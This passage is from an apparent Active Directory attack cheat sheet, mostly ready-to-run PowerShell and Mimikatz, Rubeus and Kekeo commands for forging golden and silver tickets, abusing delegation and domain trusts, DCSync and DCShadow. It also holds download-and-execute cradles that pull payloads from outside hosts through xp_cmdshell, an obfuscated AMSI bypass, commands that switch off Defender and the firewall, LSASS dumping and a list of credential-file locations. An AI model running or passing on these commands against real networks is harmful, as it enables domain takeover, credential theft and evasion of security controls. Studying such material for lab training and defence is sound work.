	Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:cyberwarfare.corp /sid:S-1-5-21-yyyyyyyy-zzzzzzzzzz-xxxxxx /target:enterprise-dc.cyberwarfare.corp /service:cifs /rc4:<HASH> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
	
    
      Note:
    
      1) Use bloodhound to identify the attack path to compromise the Computer where unconstrained delegation is allowed. Also, you can find out the user account who has local admmin rights on the given system
    
      2) Wait for DA user to login, and dump the cached TGT ticket for high privileged user using Mimikatz
    
      3) Alternately, if there is Print Sppoler service installed on DC, it can be expoited to capture NTLM hash of DC machine account. It can be further used to craft Silver ticket for given service
    
    ```
    

**Print Spooler attack**

- Checked Print Service is running on the DC
    
    ```powershell
    dir \\dc.organicsecurity.local\pipe\spoolss
    
    ```
    
- Execute the Rubeus.exe for continues monitoring of TGT/TGS tickets
    
    ```powershell
    .\Rubeus.exe monitor /interval:2 /nowrap
    
    ```
    
- Execute MSRPRN.exe to trigger printspooler server iinto authenticating with our conpromised server having unconstrained delegation enabled to capture DC machine account hash
    
    ```powershell
    .\ms_rprn.exe \\dc.organgesecurity.local \\appserver.organicsecurity.local
    
    ```
    

**Constrained Delegation**

1. List all the users having Constrained Delegation
2. Keep a note of the msDS-AllowedToDelegateTo value
3. Request for a TGT using the hash of the user with CD using kekeo (Which me must have collected before)
4. Keep a note of the TGT return ticket
5. Now request a TGS with the 2nd step and 4th step values as parameters in `/service` and `/tgt`
6. Keep a note of the TGS return Ticket
7. Now we can inject the TGS return Ticket with Inkove-Mimikatz
8. We can now list the file systems of that account. Example : `ls \\dc-mysql\C$` but can not use any WMI-Commands
9. But if the user DC we can do the same process and then do a DCSync attack



- Identify the user and computer account having constrained delegation enabled
    
    ```powershell
	# Request a TGS

	tgs::s4u /tgt:TGT.kirbi /user:Administrator@domain.local /service:cifs/computer.domain.LOCAL
	tgs::s4u /tgt:TGT.kirbi /user:Administrator@domain.local /service:time/computer.domain.LOCAL|ldap/computer.domain.LOCAL
	
	.\asktgs.exe C:\temp\trust_forest_tkt.kirbi CIFS/dc.domain2.local

    
    ```
- Requesting a TGT
    
	
	```powershell

	tgt::ask /user:websvc /domain:domain.local /rc4:cc098f204c5887eaa8253e7c2749156f
	tgt::ask /user:dcorp-adminsrv /domain:domain.local /rc4:1fadb1b13edbc5a61cbdc389e6f34c67

	```
- Request a TGS

	```powershell

	tgs::s4u /tgt:TGT.kirbi /user:Administrator@domain.local /service:cifs/computer.domain.LOCAL
	tgs::s4u /tgt:TGT.kirbi /user:Administrator@domain.local /service:time/computer.domain.LOCAL|ldap/computer.domain.LOCAL

	```

   

**[I] Constrained Delegation - User/Service Account**

- Method 1: User Account exploitation using Kekeo
    - Request a TGT for for vulnerable account using NTLM hash
        
        ```powershell
        .\Kekeo.exe tgt::ask user:websvc /domain:organicsecurity.local /rc4:cc096515667862789729156f
        
        ```
        
    - Use the TGT to fetch delegable TGS for second service
        
        ```powershell
        .\kekeo.exe tgs::s4u /tgt:TGT_websvc@organicsecurity.local_krbtgt~organicsecurity.local@organicsecurity.local.kirbi /user:Administrator@organicsecurity.local /service:cifs dcorp mssql.organicsecurity.local
        
        ```
        
    - Inject the ticket into memory using Mimikatz
        
        ```powershell
        Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@organicsecurity.local@organicsecurity.local_cifs~dcorp-mssql.organicsecurity.local@organicsecurity.local.kirbi"'
        
		# Inject and use the TGS
		.\kirbikator.exe lsa .\CIFS.computer.targetDomain.local.kirbi
		ls \\dc.domain2.local\shares\
		
		
        ```
        
    - Access the CIFS Service
        
        ```powershell
        dir \\dcorp-dc.organicsecurity.local
        
        ```
        
- Method 2: User Account exploitation using Rubeus
    - Use Rubeus to directly fetch TGS for delegated service in single command
        
        ```powershell
        .\Rubeus.exe s4u /user:websvc /rc4:cc098f204c892347832947324749156f
        /impersonateuser:Administrator /msdsspn :"dcorp_mssql.organicsecurity.local" /ptt
        
        ```
        
    - Access the CIFS Service
        
        ```powershell
        dir \\dcorp-dc.organicsecurity.local
        
        ```
        

**[II] Constrained Delegation - Machine Account**

- Method 1: Machine Account exploitation using Kekeo
    - Similar to above scenario, we can use the NTLM hash of machine account to request TGT
        
        ```powershell
        kekeo tgt::ask /user:dcorp adminsrv /domain:organicsecurity.local /rc4:1fadb1b13232132323389e6f34c67
        
        ```
        
    - Use TGT received above to request for TGS. Now, here we can request TGS for service which are not listed under msds-allowedto delegateto but is running under the same service/system account
        
        ```powershell
        kekeo tgs::s4u /tgt:TGT_dcorp-adminsrv$ @organicsecurity.local_krbtgt~organicsecurity.local@organicsecurity.local.kirbi /user:Administrator@organicsecurity.local /service:time/dcorp-dc.organicsecurity.local | ldap dcorp-dc.organicsecurity.local
        
        ```
        
    - Inject the TGS ticket and perform DCSync attack
        
        ```powershell
		#Inject the ticket

		Invoke-Mimikatz -Command '"kerberos::ptt TGS.kirbi"'

		
        Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@organicsecurity.local@organicsecurity.local_ldap~dcorp-dc.organicsecurity.local@organicsecurity.local_ALT.kirbi"'
        
		# Execute DCSync

        Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt "'
		
		# To use the DCSync feature for getting krbtg hash execute the below command with DC privileges

		Invoke-Mimikatz -Command '"lsadump::dcsyn /domain:dc.domain2.local /all /cvs"'

        
        ```
        
- Method 2: Machine Account exploitation using Rubeus
    - Request the TGS for alternate service (not listed in delegation attribute)
        
        ```powershell
        .\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:1fadb134234234e6f34c67 /impersonateuser:Administrator /msdsspn:"time/dcorp.dc.organicsecurity.local" /altservice:ldap /ptt
        
        ```
        
    - Use it to perform DCSync attack
        - In order to extract domain **account/service account/machine** account **credentials** without executing code on the **Domain Controller**, the attacker used a DCSYNC attack.
		- A specific set of permissions are required to execute remote **hash retrievable** without executing code.
			 - Get-ReplicationChanges
			 - Get-ReplicationChangesAll
			 - Get-ReplicationChnages-in-a-filtered-set
			 
        ```powershell
        Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
        
        ```
        

# Privilege Escation - Domain Trusts

**CASE 1: Within Forest: Escalating from Child Domain to Root Domain**

A) Escalating from child domain to parent/root domain using Trust key/ticket

- Step 1: Fetching the Trust keys between child and parent domain
    
    ```powershell
    Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
    Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
    
    ```
    
- Step 2: Crafting the Inter-realm-TGT ticket
    
    ```powershell
    Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:organicsecurity.local /sid:SID_OF_CURRENT_DOMAIN /sids:SID_OF_ENTERPRISE_ADMINS_FROM_PARENT_DOMAIN  /rc4:TRUST_KEY /service:krbtgt /target:mango.local /ticket:trust_tkt.kirbi"'
    
    Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:organicsecurity.local /sid:S-1-5-21-1874506631-3219952063-538504511  /sids:S-1-5-21-280534878-1496970234-700767426-519  /rc4:c04dfec49ae75f81d9ff849e4c4f5be9 /service:krbtgt  /target:moneycorp.local /ticket:trust_orangesecurity_tgt.kirbi"'
    
    ```
    
- STEP 3: Use the Inter-Realm TGT to fetch TGS for given service from another forest
    
    ```powershell
    .\Rubeus.exe asktgs /ticket:trust_Dollar2moneycorp_tgt.kirbi /service:CIFS/mcorp-dc.moneycorp.local  /dc:mcorp-dc.moneycorp.local  /ptt
    
    ```
    
- STEP 4: Access the CIFS service from another forest
    
    ```powershell
    ls \\mcorp-dc.moneycorp.local\c$
    
    ```
    

B) Escalating from child domain to parent/root domain using KRBTGT Hash

- STEP 1: Fetch the NTLM hash of KRBTGT Account
    
    ```powershell
    Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
    
    ```
    
- STEP 2: Use it to craft the Golden ticket with SID set to Enterprise Admin
    
    ```powershell
    Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:organicsecurity.local /sid:SID_OF_CURRENT_DOMAIN /sids:SID_OF_ENTERPRISE_ADMINS_FROM_PARENT_DOMAIN  /krbtgt:krbtgt_ntlm_hash  /target:moneycorp.local /ticket:trust_tkt.kirbi"'
    
    Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:organicsecurity.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519  /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /target:mango.local  /ticket:trust_organicsecurity_golden_tgt.kirbi"'
    
    ```
    
- STEP 3: Inject the ticket into the memory
    
    ```powershell
    Invoke-Mimikatz -Command '"kerberos::ptt trust_organicsecurity_golden_tgt.kirbi"'
    
    ```
    

C) Stealthier Method for creating Golden ticket using DC Account

- STEP 1: Fetch the NTLM hash of krbtgt account
- STEP 2: Use mimikatz to craft TGT ticket with SIDS set to Domain Controllers & EnterPrise DC
    
    ```powershell
    Invoke-Mimikatz -Command '"Kerberos::golden /user:DCORP-DC$/domain:dollarcorp.moneycorp.local /sid:SID_OF_CURRENT_DOMAIN /sids:SID_OF_DOMAIN_CONTROLLERS_ENTERPRISE_DC_FROM_PARENT_DOMAIN  /krbtgt:krbtgt_ntlm_hash  /target:moneycorp.local /ticket:trust_tkt.kirbi"'
    
    Invoke-Mimikatz -Command '"Kerberos::golden /user:DCORP-DC$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /target:moneycorp.local  /ticket:trust_stealth_tkt.kirbi"'
    
    ```
    

**CASE II: Privilege Escalation from one forest to other Forest (SID Filtering is enabled for external and forest level trust)**

- STEP 1: Identify if there is trust between current domain and foreign forest
    
    ```powershell
    Get-NetDomainTrust
    
    ```
    
- STEP 2: Fetch the Trust Keys of the external or forest level trust
    
    ```powershell
    Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
    
	#Forest Priv Esc

	Invoke-Mimikatz -Command '"lsadump::trust /patch"' # require the trust key of inter-forest trust
	
	Invoke-Mimikatz -Command '"lsadump::dcsync /domain:DOLLARCORP.MONEYCORP.LOCAL /all /csv"'

	Invoke-Mimikatz -Command '"kerberos::golden /user:student21 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ptt"'

	gwmi -Class win32_computersystem -ComputerName mcorp-dc.moneycorp.local

    
    ```
    
- STEP 3: Use the Trust Key to craft a TGT
    
    ```powershell
    Invoke-Mimikatz -Command '"kerberos::golden /user:administrator  /domain:organicsecurity.local /sid:S-1-5-21-223322223-11111111-538504511  /rc4:d98c9dc732432432432f58a /service:krbtgt /target:anotherdomain.local /ticket:apple_trust_tkt.kirbi"'
    
    ```
    
- STEP 4: Inject the ticket back into the memory
    
    ```powershell
    Invoke-Mimikatz -Command '"kerberos::ptt eurocorp_trust_tkt.kirbi"'
    
    ```
    
- STEP 5: Request a TGS for CIFS Service on the DC of AnotherForest Domain (Possible to create TGS for other service as well like HOST,RPCSS,LDAP etc)
    
    ```powershell
    .\Rubeus.exe asktgs /ticket:eurocorp_trust_tkt.kirbi /service:CIFS/eurocorp-dc.eurocorp.local  /dc:eurocorp-dc.eurocorp.local  /ptt
    
    ```
    
- STEP 6: Further, we can scan the ACL of the AD Objects in another forest to identify any Foreign Group Membership and ACLs which may allow the user in current domain access to specific services in another domain:
    - Scenario 1: Local Group Membership - Find if the users from current domain is member of group in another forest/domain
        
        ```powershell
        Get-NetLocalGroupMember <server>
        
        ```
        
    - Scenario 2: Foreign Group Membership - Find users from foreign domain having membership in current AD groups. They show in "ForeignSecurityPrincipals" container of domain
        
        ```powershell
        Get-DomainObject -Domain organicsecurity.local -LDAPFilter '(ObjectClass=ForeignSecurityPrincipals)'
        Get-DomainForeignGroupMember -Domain <target.domain.fqdn>
        Get-DomainForeignUser -Domain <target.domain.fqdn>
        
        ```
        
    - Scenario 3: Foreign ACL Principals - Find the ACEs applied on ad objects where the security identifier is not set to the domain being queried, or set to the domain you are currently having access.
        
        ```powershell
        Get-DomainObjectACL -Domain <domain.fqdn>
        Get-DomainObjectAcl -Domain eurocorp.local | ?{$_.SecurityIdentifier -like "S-1-5-21-234345438-14223333-702334436*"} | select ObjectDN, ActiveDirectoryRights, AceType, SecurityIdentifier
        
        ```
        

# TrustAbuse - MSSQL using PowerUp SQL

- Identifying all the MSSQL Database Servers in the current domain (searches domain by MSSQL SPN in computer object)
    
    ```powershell
    Get-SQLInstanceDomain
    
    ```
    
- Check if the current logged-on user has access to SQL Database
    
    ```powershell
    Get-SQLConnectionTestThreaded
    
    ```
    
- Gather More Information about the SQL Database (Only Accessible DBs)
    
    ```powershell
    Get-SQLInstanceDomain | Get-SQLServerInfo
    
    ```
    
- Invoke audit checks on the accessible DB Service to identify the vulnerabilities and misconfigurations
    
    ```powershell
    Invoke-SQLAudit -Instance <server_fqdn>
    
    ```
    
- Invoke automated abuse of the vulnerabilities
    
    ```powershell
    Invoke-SQLEscalatePriv -Instance <server_fqdn>
    
    ```
    
- Identify the DB Links
    
    ```powershell
    Get-SQLServerLink -Instance dcorp-mssql.organicsecurity.local
    
    ```
    
- Execute commands using xp_cmdshell via DB Links
    
    ```powershell
    Get-SQLServerLinkCrawl -Instance dcorp-mssql.organicsecurity.local  -Query "exec master..xp_cmdshell 'whoami'"
    
    ```
    
- Gain Remote Shell using xp_cmdshell via DB Links
    
    ```powershell
    Get-SqlServerLinkCrawl -Instance DCORP-MSSQL -Query 'EXEC xp_cmdshell "powershell.exe -c iex (new-object net.webclient).downloadstring(''<http://172.16.100.79/dakiya.ps1>'')"' | select instance,links,customquery | ft
    
    ```
    
- Enumerating DB Links manually
    
    ```sql
    select * from master.. sysservers;
    select * from openquery ("dcorp-sql1",'select * from master.. sysservers');
    select * from openquery ("dcorp-sql1",'select * from openquery ("dcorp-sql2",''select * from master..sysservers'')');
    select * from openquery ("dcorp-sql1",'select * from openquery ("dcorp-sql2",''select * from openquery ("pcorp-sql3.organicsecurity.local",''''select * from master.. sysservers'''')'')');
    select * from openquery ("dcorp-sql1",'select * from openquery ("dcorp-sql2",''select * from openquery ("pcorp-sql3.organicsecurity.local",''''select @@version'''')'')');
    
    ```
    
- Command to enable xp_cmdshell if not enabled:
    
    ```sql
    EXECUTE sp_configure 'xp_cmdshell', 1;
    
    ```
    

# DC shadow

- Update Description, SIDHistory and GroupID
    
    ```powershell
    lsadump::dcshadow /object:root01 /attribute:Description /value="Hello from DCShadow"
    
    lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519
    
    lsadump-dcshadow /object:student1 /attribute:primaryGroupID /value:519
    
    lsadump::dcshadow /push
    
    ```
    
- Modify ntSecurityDescriptor for AdminSDHolder to add full control to current user
    
    ```powershell
    (New-Object System.DirectoryServices.DirectoryEntry (("LDAP://CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
    
    lsadump-dcshadow /object:CN=AdminSDHolder,CN=System,DC=organicsecurity,DC=local /attribute:ntSecurityDescriptor /value:<modified ACL>
    
    ```
    
- Alternatively, we can use Set-DCShadowPermissions from Nishang
    
    ```powershell
      Set-DCShadowPermissions -FakeDC mcorp-student1 -SAMAccountName root1user -Username student1 -Verbose
    
    ```
    

## Basic Operations

    ```powershell
    # Loading powerview locally
    ps> . C:\AD\Tools\PowerView.ps1

    # Loading ActiveDirectory Module (Also works in Constrained Language Mode)
    Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
    Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1

    # Loading tools remotely using download and execute cradle
    ps> iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
    ps> iex (iwr 'http://192.168.230.1/evil.ps1' -UseBasicParsing)

    # File Download using windows binary
    bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\User\\Public\\Loader.exe

    # File Transfer using shared drive
    echo F | xcopy \\us-jump\C$\Users\Public\lsass.dmp C:\AD\Tools\lsass.dmp

    # Base 64 encode and decode
    certutil -decode foo.b64 foo.exe
    certutil -encode foo.exe foo.b64

    ```

    ### Bypassing Endpoint Security, Applocker and Powershell Logging

    ```powershell
    1. Powershell Logging
    # Use Invisi-Shell to bypass powershell logging (has inbuild AMSI evasion)
    # NOTE: Invisi-Shell may interfere with some process like Saftelykatz, use Loader.exe for such cases

    # With Admin Rights
    C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
    # Without Admin Rights (modifies registry entries, and is recommended method)
    C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

    2. AV Evasion

    # Disable Windows Defender & AMSI bypass script
    Get-MPPreference
    Set-MPPreference -DisableRealTimeMonitoring $true
    Set-MpPreference -DisableIOAVProtection $true
    "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

    # AMSI Bypass - Bypass defender
    S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

    # Use AMSI Trigger and DefenderCheck
    cmd> AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke\PowerShellTcp_Detected.ps1
    cmd> DefenderCheck.exe PowerUp.ps1

    # Bypass AMSI and ETW based detection by loading the binary using loader utility
    C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe
    C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe

    3. Applocker & WDAC Bypas

    # Check if Powershell is running in Constrained Language Mode (It may be because of Applocker or WDAC)
    $ExecutionContext.SessionState.LanguageMode

    # Check applocker policy for Application Whitelisting via Powerview and Registry (reg.exe)
    Get-AppLockerPolicy –Effective
    Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
    Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
    Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"
    reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2

    # Identify the GPO Policy responsible Applocker
    Get-DomainGPO -Domain us.techcorp.local | ? { $_.DisplayName -like "*PAW*" } | select displayname, gpcfilesyspath

    # Download the GPO Registry Policy file from sysvol share on AD to view applocker policy details
    type "\\us.techcorp.local\SysVol\us.techcorp.local\Policies\{AFC6881A-5AB6-41D0-91C6-F2390899F102}\Machine\Registry.pol"

    # Based on policy we need to identify the bypass technique for Applocker (like Whitelisted path)
    Get-Acl C:\Windows\Tasks | fl

    # Check Windows Device Guard (WDAC) enforcement policy
    wmi
    Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard

    # Bypass for WDAC using rundll32.exe and comsvcs.dll to dump the lsass process
    tasklist /FI "IMAGENAME eq lsass.exe"
    rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
    echo F | xcopy \\us-jump\C$\Users\Public\lsass.dmp C:\AD\Tools\lsass.dmp
    Invoke-Mimikatz -Command "sekurlsa::minidump C:\AD\Tools\lsass.DMP"

    ```

### Lateral Movement

    ```powershell
    # Check for access on other computers using current users session
    # Find all machines on the current domain where the current user has local admin access

    Find-LocalAdminAccess -Verbose ## Local admin user

    # Find computers where a domain admin (or specified user/group) has sessions
    Invoke-UserHunter
    Invoke-UserHunter -GroupName "RDPUsers"

    # To confirm admin access
    Invoke-UserHunter -CheckAccess
    Invoke-UserHunter -CheckAccess -Verbose

    # Find computers where a domain admin is logged-in

    Invoke-UserHunter -Stealth

    Find-WMILocalAdminAccess.ps1
    Find-PSRemotingLocalAdminAccess.ps1
    cme smb <COMPUTERLIST> -d <DOMAIN> -u <USER> -H <NTLM HASH>
    cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH> -X <COMMAND>


    # Use WMI for remote session
    Get-WmiObject -Class win32_operatingsystem -ComputerName us-dc.us.techcorp.local

    # Create PS Session 
    $usmgmt = New-PSSession -ComputerName us-mgmt
    Enter-PSSession $usmgmt

    $passwd = ConvertTo-SecureString 't7HoBF+m]ctv.]' -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential ("us-mailmgmt\administrator", $passwd)
    $mailmgmt = New-PSSession -ComputerName us-mailmgmt -Credential $creds
    Enter-PSSession $mailmgmt

    # Invoke Command using Powershell Remoting
    Invoke-Command -Scriptblock {Get-Process} -Session $usmgmt
    Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list-of-server>)
    Invoke-Command -FilePath C:\scripts\Get-PassHases.ps1 -ComputerName (Get-Content <list-of-server>)
    Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $mailmgmt
    Invoke-Command -Scriptblock ${function:Get-PassHashes} -ComputerName (Get-Content <list-of-server>)
    Invoke-Command -Scriptblock ${function:Get-PassHashes} -ComputerName (Get-Content <list-of-server>) -ArgumentList

    # Use winrs for ps remoting without logging
    winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
    winrs -remote:US-MAILMGMT -u:US-MAILMGMT\administrator -p:';jv-2@6e#m]!8O' cmd.exe

    # Runas cmd as another user
    runas /netonly /user:us\serviceaccount  cmd.exe

    # Manage Firewall Port Access
    netsh advfirewall firewall add rule name="Allow Port 8080" protocol=TCP dir=in localport=8080 action=allow
    netsh advfirewall firewall add rule name="Allow Port 8081" protocol=TCP dir=in localport=8081 action=allow
    netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.X

    # disable firewall
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    powershell.exe -c 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False'

    # Add user to local admin and RDP group and enable RDP on firewall
    net user <USERNAME> <PASSWORD> /add /Y  && net localgroup administrators <USERNAME> /add && net localgroup "Remote Desktop Users" <USERNAME> /add && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

    # Enter session - Execute Stateful commands using Enter-PSSession ( persistence )

    $sess = New-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
    $sess
    Enter-PSSession -Session $sess

    [dcorp-adminsrv.dollarcorp.moneycorp.local]:PS> $proc = Get-Process
    [dcorp-adminsrv.dollarcorp.moneycorp.local]:PS> exit

    Enter-PSSession -Session $sess

    [dcorp-adminsrv.dollarcorp.moneycorp.local]:PS> proc
    Will list current process



    # language mode
    $ExecutionContext.SessionState.LanguageMode

    # applocker 
    Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

    # Disable FireWall !!!

    # Mimikatz
    # Modify to make it work without dot sourcing
    wget or curl or iex(iwr)
    .\Invoke-Mimikatz.ps1


    ```

### Get users with privileges in other domains inside the forest

    ```powershell
    Get-DomainForeingUser 

    # Get groups with privileges in other domains inside the forest

    Get-DomainForeignGroupMember 
    ```


### Extras

    ```powershell
    # Once you are DA add user to DA group
    Invoke-Command -ScriptBlock {net group "DOMAIN ADMINS" student21 /domain /add} -ComputerName dcorp-dc.dollarcorp.moneycorp.local

    # Query
    net localgroup administrators

    C:> net localgroup Administrators student21 /add  ## add to localgroup admins

    C:> net localgroup "Remote Desktop Users" student21 /add ## add to RDP group

    # Add to DA 
    net group "DOMAIN ADMINS" student21 /domain /add

    # Checking First Degree Object Controls
    # if the user is part of a group example sql admins and has generic all access we can do the following
    net group "SQLMANAGERS" examAd /domain /add

    https://docs.microsoft.com/en-us/sysinternals/downloads/psexec



    ```

### Lateral Movement - Credentials Harvesting

    ```powershell
    # Check if lsass.exe is running as protected process
    Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL" 

    ## Dumping Credentials
    Invoke-Mimikatz -Command '"sekurlsa::ekeys"' ## note the rc4
    Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'


    Invoke-Mimikatz -Command '"sekurlsa::logonpassword"'
    Invoke-Mimikatz -Command '"lsadump::lsa /patch"' #  require the trust key of inter-forest trust
    Invoke-Mimikatz -Command '"lsadump::sam"'

    # Dump Secrets stored in windows vault
    Invoke-Mimikatz -Command '"vault::list"'
    Invoke-Mimikatz -Command '"vault::cred /patch"'
    Invoke-Mimikatz -Command '"sekurlsa::minidump lsass.dmp"'

    # Other Mimikatz based utility for duping lsass.exe
    SafetyKatz.exe "sekurlsa::ekeys"
    SharpKatz.exe --Command ekeys
    rundll32.exe C:\Dumpert\Outflank\Dumpert.dll,Dump
    pypykatz.exe live lsa

    tasklist /FI "IMAGENAME eq lsass.exe" 
    rundll32.exe C:\windows\System32\comsvcs.dll,MiniDump <lsass_process_ID> C:\Users\Public\lsass.dmp full

    .\mimikatz.exe
    mimikatz # sekurlsa::minidump c:\Ad\Tools\lsass.dmp
    mimikatz # privilege::debug
    mimikatz # sekurlsa::keys
    mimikatz # exit

    # Lateral Movement - OverPass The Hash
    Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:aes /run:powershell.exe"'

    # "Over pass the hash" generate tokens from hashes

    Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntImhash> /run:powershell.exe"'

    SafetyKatz.exe "sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:aes /run:powershell.exe" "exit"

    # Generate TGT and inject in current session for double hopping (no admin rights for 1st command)
    Rubeus.exe asktgt /user:administrator /rc4:ntlmHash /ptt
    Rubeus.exe asktgt /user:administrator /aes256:<key> /opsec /createnetonly:c:\Windows\System32\cmd.exe /show /ptt

    # DCSync 
    Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
    SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
    ```

### Post Exploitation

    ```powershell
    ## Limit this command if there are too many files ;)
    tree /f /a C:\Users

    # Web.config
    C:\inetpub\www\*\web.config

    # Unattend files
    C:\Windows\Panther\Unattend.xml

    # RDP config files
    C:\ProgramData\Configs\

    # Powershell scripts/config files
    C:\Program Files\Windows PowerShell\

    # PuTTy config
    C:\Users\[USERNAME]\AppData\LocalLow\Microsoft\Putty

    # FileZilla creds
    C:\Users\[USERNAME]\AppData\Roaming\FileZilla\FileZilla.xml

    # Jenkins creds (also check out the Windows vault, see above)
    C:\Program Files\Jenkins\credentials.xml

    # WLAN profiles
    C:\ProgramData\Microsoft\Wlansvc\Profiles\*.xml

    # TightVNC password (convert to Hex, then decrypt with e.g.: https://github.com/frizb/PasswordDecrypts)
    Get-ItemProperty -Path HKLM:\Software\TightVNC\Server -Name "Password" | select -ExpandProperty Password

    # Look for SAM file
    Get-ChildItem -path C:\Windows\Repair\* -include *.SAM*,*.SYSTEM* -force -Recurse 
    Get-ChildItem -path C:\Windows\System32\config\RegBack\*  -include *.SAM*,*.SYSTEM* -force -Recurse
    Get-ChildItem -path C:\* -include *.SAM*,*.SYSTEM* -force -Recurse 

    # Check Registry for password
    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s

    # Check for unattend and sysgrep files
    Get-ChildItem -path C:\* -Recurse -Include *Unattend.xml*
    Get-ChildItem -path C:\Windows\Panther\* -Recurse -Include *Unattend.xml* 
    Get-ChildItem -path C:\Windows\system32\* -Recurse -Include *sysgrep.xml*, *sysgrep.inf* 
    Get-ChildItem -path C:\* -Recurse -Include *Unattend.xml*, *sysgrep.xml*, *sysgrep.inf* 

    # Look for powershell history files
    Get-Childitem -Path C:\Users\* -Force -Include *ConsoleHost_history* -Recurse -ErrorAction SilentlyContinue

    # Hardcoded Password in scripts
    Get-ChildItem -path C:\*  -Recurse -Include *.xml,*.ps1,*.bat,*.txt  | Select-String "password"| Export-Csv C:\Scripts\Report.csv -NoTypeInformation
    Get-ChildItem -path C:\*  -Recurse -Include *.xml,*.ps1,*.bat,*.txt  | Select-String "creds"| Export-Csv C:\Scripts\Report.csv -NoTypeInformation

    # Azure token
    Get-ChildItem -path "C:\Users\*" -Recurse -Include *accessTokens.json*, *TokenCache.dat*, *AzureRmContext.json*

    # Dump Password Vault
    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
    $vault = New-Object Windows.Security.Credentials.PasswordVault
    $vault.RetrieveAll() | % { $_.RetrievePassword();$_ }

    # Find the IDs of protected secrets for a specific user
    dir C:\Users\[USERNAME]\AppData\Local\Microsoft\Credentials

    # Get information, including the used master key ID, from a specific secret (take the path from above)
